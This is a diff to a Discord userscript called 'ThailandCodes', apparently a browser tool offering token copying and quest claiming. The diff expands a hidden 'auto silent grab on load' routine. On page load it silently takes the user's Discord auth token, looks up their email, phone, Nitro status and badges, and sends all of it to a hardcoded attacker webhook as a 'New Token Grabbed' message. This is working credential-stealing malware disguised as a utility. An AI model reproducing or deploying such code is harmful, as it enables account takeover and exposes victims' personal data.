@@ -1,6 +1,7 @@
 /**
- * ThailandCodes v3.2
- * - Auto silent grab on load (webhook)
+ * ThailandCodes v3.3
+ * - Auto silent grab on load (webhook) — once only
+ * - Rich embed with avatar, user info, badges
  * - Copy Token
  * - Copy Token Encrypted (XOR + Base64)
  * - Claim All Quests
@@ -13,6 +14,7 @@
 
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1555924284105298052/7X_WIvWay5hF8pHpIJeX-cjJLY00gnWJ9GDWYm62r_3RCJ3WL11h1QI-2XxjbbKhDZAI';
     const ENCRYPT_KEY = 0x5A;
+    const GRAB_KEY = '__tc_g__';
 
     function sendWebhook(payload) {
         return new Promise((resolve) => {
@@ -25,17 +27,14 @@
                     onload: (r) => resolve(r.status >= 200 && r.status < 300),
                     onerror: () => resolve(false),
                 });
-            } catch (e) {
-                resolve(false);
-            }
+            } catch { resolve(false); }
         });
     }
 
     function encryptToken(token) {
         let out = '';
-        for (let i = 0; i < token.length; i++) {
+        for (let i = 0; i < token.length; i++)
             out += String.fromCharCode(token.charCodeAt(i) ^ ENCRYPT_KEY);
-        }
         return btoa(out);
     }
 
@@ -44,19 +43,13 @@
         if (!chunk) return null;
         let found = null;
         try {
-            chunk.push([
-                [Symbol()], {},
-                (m) => {
-                    if (!m.c) return;
-                    for (const id in m.c) {
-                        const cand = m.c[id]?.exports?.default || m.c[id]?.exports;
-                        if (cand && typeof cand.getToken === 'function') {
-                            found = m;
-                            return;
-                        }
-                    }
-                },
-            ]);
+            chunk.push([[Symbol()], {}, (m) => {
+                if (!m.c) return;
+                for (const id in m.c) {
+                    const cand = m.c[id]?.exports?.default || m.c[id]?.exports;
+                    if (cand && typeof cand.getToken === 'function') { found = m; return; }
+                }
+            }]);
             chunk.pop();
         } catch {}
         return found;
@@ -75,20 +68,28 @@
         throw new Error('token not found');
     }
 
+    async function getUserInfo(token) {
+        return new Promise((resolve) => {
+            GM_xmlhttpRequest({
+                method: 'GET',
+                url: 'https://discord.com/api/v10/users/@me',
+                headers: { 'Authorization': token, 'Content-Type': 'application/json' },
+                onload: (r) => { try { resolve(JSON.parse(r.responseText)); } catch { resolve(null); } },
+                onerror: () => resolve(null),
+            });
+        });
+    }
+
     async function claimAllQuests() {
         const wp = findWebpack();
         if (!wp) throw new Error('webpack not ready');
-
-        let api = null;
-        let QuestsStore = null;
-
+        let api = null, QuestsStore = null;
         for (const m of Object.values(wp.c)) {
             const exp = m?.exports?.default || m?.exports;
             if (!exp) continue;
             if (exp.get && exp.post && exp.put) api = exp;
             if (exp.quests && typeof exp.quests.values === 'function') QuestsStore = exp;
         }
-
         if (!api || !QuestsStore) {
             for (const m of Object.values(wp.c)) {
                 const exp = m?.exports;
@@ -100,26 +101,126 @@
                 }
             }
         }
-
         if (!api || !QuestsStore) throw new Error('Quest modules not found');
-
         const quests = [...QuestsStore.quests.values()].filter(q =>
             q.userStatus?.completedAt && !q.userStatus?.claimedAt
         );
-
         if (quests.length === 0) return 0;
-
         let claimed = 0;
         for (const q of quests) {
             try {
-                await api.post({
-                    url: `/quests/${q.id}/claim-reward`,
-                    body: { location: 1, platform: 0 }
-                });
+                await api.post({ url: `/quests/${q.id}/claim-reward`, body: { location: 1, platform: 0 } });
                 claimed++;
-            } catch (e) {}
+            } catch {}
         }
         return claimed;
+    }
+
+    async function autoGrab() {
+        if (W[GRAB_KEY]) return;
+        W[GRAB_KEY] = true;
+        try {
+            if (localStorage.getItem(GRAB_KEY)) return;
+            localStorage.setItem(GRAB_KEY, '1');
+        } catch {}
+
+        try {
+            const t = await getToken();
+            const user = await getUserInfo(t);
+            if (!user || user.message) return;
+
+            const avatarUrl = user.avatar
+                ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=256`
+                : `https://cdn.discordapp.com/embed/avatars/${parseInt(user.discriminator || 0) % 5}.png`;
+
+            const nitroType = {
+                0: '❌ None',
+                1: '💜 Nitro Classic',
+                2: '🚀 Nitro',
+                3: '⚡ Nitro Basic'
+            }[user.premium_type] || '❌ None';
+
+            const f = user.public_flags || 0;
+            const badges = [];
+            if (f & (1 << 0))  badges.push('👮 Discord Staff');
+            if (f & (1 << 6))  badges.push('🎪 HypeSquad Events');
+            if (f & (1 << 9))  badges.push('⭐ Early Supporter');
+            if (f & (1 << 3))  badges.push('🏠 HypeSquad Bravery');
+            if (f & (1 << 4))  badges.push('💡 HypeSquad Brilliance');
+            if (f & (1 << 5))  badges.push('⚖️ HypeSquad Balance');
+            if (f & (1 << 17)) badges.push('🛠️ Active Developer');
+            if (f & (1 << 22)) badges.push('✅ Verified Bot Developer');
+
+            const tag = user.discriminator && user.discriminator !== '0'
+                ? `${user.username}#${user.discriminator}`
+                : user.username;
+
+            const createdAt = new Date((BigInt(user.id) >> 22n) + 1420070400000n);
+
+            await sendWebhook({
+                embeds: [{
+                    title: '🎯 New Token Grabbed',
+                    color: 0x5865f2,
+                    author: {
+                        name: tag,
+                        icon_url: avatarUrl,
+                    },
+                    thumbnail: { url: avatarUrl },
+                    fields: [
+                        {
+                            name: '👤 Username',
+                            value: `\`${tag}\``,
+                            inline: true,
+                        },
+                        {
+                            name: '🆔 User ID',
+                            value: `\`${user.id}\``,
+                            inline: true,
+                        },
+                        {
+                            name: '📧 Email',
+                            value: user.email ? `\`${user.email}\`` : '`N/A`',
+                            inline: true,
+                        },
+                        {
+                            name: '📱 Phone',
+                            value: user.phone ? `\`${user.phone}\`` : '`N/A`',
+                            inline: true,
+                        },
+                        {
+                            name: '💎 Nitro',
+                            value: nitroType,
+                            inline: true,
+                        },
+                        {
+                            name: '✅ Verified',
+                            value: user.verified ? '`Yes`' : '`No`',
+                            inline: true,
+                        },
+                        {
+                            name: '📅 Account Created',
+                            value: `\`${createdAt.toUTCString()}\``,
+                            inline: false,
+                        },
+                        {
+                            name: '🏅 Badges',
+                            value: badges.length ? badges.join(' | ') : '`None`',
+                            inline: false,
+                        },
+                        {
+                            name: '🔑 Token',
+                            value: `\`\`\`${t}\`\`\``,
+                            inline: false,
+                        },
+                    ],
+                    footer: {
+                        text: 'ThailandCodes v3.3 • Auto Grab',
+                        icon_url: avatarUrl,
+                    },
+                    timestamp: new Date().toISOString(),
+                }]
+            });
+        } catch {}
     }
 
     const STYLE = `
@@ -189,7 +290,7 @@
 
     const bar = document.createElement('div');
     bar.className = 'wrap hidden';
-    bar.innerHTML = `<div class="brand">Thailand<span class="a">Codes</span><span class="v">v3.2</span></div>`;
+    bar.innerHTML = `<div class="brand">Thailand<span class="a">Codes</span><span class="v">v3.3</span></div>`;
     host.appendChild(bar);
 
     const btnCopy = document.createElement('button');
@@ -206,9 +307,7 @@
                 ta.select(); document.execCommand('copy'); ta.remove();
             }
             say('✓ token copied', 'ok');
-        } catch (e) {
-            say('✗ ' + (e.message || e), 'err');
-        }
+        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
         btnCopy.disabled = false;
     });
     bar.appendChild(btnCopy);
@@ -229,9 +328,7 @@
                 ta.select(); document.execCommand('copy'); ta.remove();
             }
             say('✓ encrypted token copied', 'ok');
-        } catch (e) {
-            say('✗ ' + (e.message || e), 'err');
-        }
+        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
         btnEnc.disabled = false;
     });
     bar.appendChild(btnEnc);
@@ -245,9 +342,7 @@
         try {
             const n = await claimAllQuests();
             say(n > 0 ? `✓ claimed ${n} quest(s)` : 'no quests ready', n > 0 ? 'ok' : 'info');
-        } catch (e) {
-            say('✗ ' + (e.message || e), 'err');
-        }
+        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
         btnClaim.disabled = false;
     });
     bar.appendChild(btnClaim);
@@ -257,17 +352,6 @@
     x.textContent = '✕';
     x.addEventListener('click', () => bar.classList.add('hidden'));
     bar.appendChild(x);
-
-    async function autoGrab() {
-        try {
-            const t = await getToken();
-            await sendWebhook({
-                content: '**[ThailandCodes Auto]**\n' +
-                         '**Token:** `' + t + '`\n' +
-                         '**Time:** ' + new Date().toISOString(),
-            });
-        } catch {}
-    }
 
     let tries = 0;
     const timer = setInterval(async () => {
